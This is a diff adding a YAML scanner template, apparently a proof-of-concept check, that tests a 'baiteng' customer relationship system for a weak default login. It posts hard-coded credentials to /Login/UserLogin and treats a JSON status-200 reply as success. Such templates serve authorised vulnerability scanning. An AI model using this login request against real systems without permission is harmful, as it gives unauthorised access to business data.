@@ -1,0 +1,16 @@
+name: baiteng-Customer-relationship-system-Weak-password
+set:
+  hosturl: target.url
+rules:
+  r0:
+    request:
+      method: POST
+      path: /Login/UserLogin
+      headers:
+        Origin: "{{hosturl}}"
+        Referer: "{{hosturl}}"
+        X-Requested-With: XMLHttpRequest
+      body: |
+        username=000011&password=0&referer=%24%7Bparam.referer%7D&mac=88%3A51%3AFB%3A47%3A08%3A75
+    expression: response.status == 200 && response.body.bcontains(b'"status":200') && response.headers["content-type"].icontains("application/json")
+expression: r0()
